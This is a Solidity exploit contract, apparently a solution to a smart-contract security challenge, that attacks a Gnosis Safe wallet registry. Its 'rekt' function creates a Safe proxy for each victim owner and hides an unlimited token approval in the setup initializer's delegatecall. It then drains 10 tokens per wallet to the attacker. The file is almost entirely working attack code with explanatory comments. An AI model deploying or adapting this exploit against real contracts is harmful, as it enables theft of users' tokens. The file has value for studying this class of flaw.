// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";


interface IProxyFactory{
    function createProxyWithCallback(address _singleton, bytes memory initializer, uint256 saltNonce, IProxyCreationCallback callback) external returns (GnosisSafeProxy proxy);
}

// The callback contract should have implemented a function with the name "proxyCreated" in order to work,
// Analogue to the previous examples about flashloans that trigger a specific callback within the borrower contract.
contract WalletRegistryCracker {

    IERC20 private token;
    IProxyFactory private proxyFactory;
    address private walletRegistry;
    address public singleton;
    address public attacker;

    constructor(address _token, address _proxyFactory, address _singleton, address _walletRegistry){
        token = IERC20(_token);
        proxyFactory = IProxyFactory(_proxyFactory);
        singleton = _singleton;
        walletRegistry = _walletRegistry;
        attacker = msg.sender;
    }

    // The magic in here is the delegation.8
    // On delegatecalls the logic implemented comes from another contract but its
    // changes on states impact on the caller contract!
    function triggerApproveForAll(address _spender, address _token) external {
        IERC20(_token).approve(_spender, type(uint256).max);
    }
    
    // Here is where the magic happens.
    //  NOTE: the input parameters can be also hardcoded or injected into the contract while 
    //  constructing. The decision of leaving them here is to explain afterwards each one of them.
    //  NOTE: This function performs a theft to a single user. A loop is needed to reproduce it.
    function rekt(
        address[] calldata _owners
    ) external {
        // require(msg.sender==attacker, "!attacker"); // There is no point to do this... the transferFrom targets us anyways!
        for (uint8 i = 0; i < _owners.length; i++) {
            // The proxy creation requires the owner parameter to be an array.
            address[] memory ownerArray = new address[](1);
            ownerArray[0] = _owners[i];

            // Lets encode some data first. We will use it briefly!
            bytes memory approvePayload = abi.encodeWithSelector(WalletRegistryCracker.triggerApproveForAll.selector, 
                address(this), 
                address(token
            ));
                
            // We need to encode the initializer (the data will be passed on proxy deployment).
            // to do so, we need to look closer the "setup" function under GnosisSafe.sol
            bytes memory _initializer = abi.encodeWithSelector(GnosisSafe.setup.selector, 
                ownerArray,         // _owner/s array (although this is one owner, it needs to be an array)
                1,                  // _threshold can be at max 1 by callback require
                address(this),      // contract for optional delegatecall (our attacker contract!)
                approvePayload,     // delegatecall data (the weak point!)
                address(0),         // handler for fallback calls. No need!
                address(0),         // payment token address for fallback calls. (0) for ETH.
                0,                  // amount of tokens that should be paid.
                address(0)          // Receiver of the payment. If (0), receiver will be tx.origin. 
            );

            // It doesn't matter in here relying on on-chain parameters. 
            // Being able to predestinate the proxy address with this pseudorandomness is not an issue.
            // Used timestamp as an example. Nonce can also be: 9, 12, 2018, 3, 1 or even the i index for example.
            uint256 saltNonce = block.timestamp; 
            
            // Using a french analogy; The Mise en Place is now ready to cook our dish!
            /// @return proxy instance 
            GnosisSafeProxy proxyInstance =  proxyFactory.createProxyWithCallback(
                singleton, 
                _initializer, 
                saltNonce, 
                IProxyCreationCallback(walletRegistry
            ));

            // by this point, we are now approved by the WalletRegistry contract to transfer 10 tokens.
            // Make it rain.
            token.transferFrom(address(proxyInstance), attacker, 10 ether); 
            // No ether transfers in here. Just 10 * decimals() tokens transfered.   
        }
    }



}